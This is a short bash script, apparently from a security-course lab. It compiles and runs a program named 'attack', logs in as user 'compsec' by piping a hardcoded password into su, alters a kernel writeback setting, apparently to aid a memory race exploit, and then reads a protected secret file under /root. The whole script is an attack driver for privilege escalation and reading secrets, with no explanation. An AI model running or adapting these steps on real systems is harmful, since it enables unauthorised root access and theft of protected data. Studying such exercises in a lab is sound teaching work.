#!/bin/bash

gcc main.c -o attack -lpthread
./attack
echo 236653 | su compsec
echo 0 > /proc/sys/vm/dirty_writeback_centisec

cat /root/secrets/student1/secret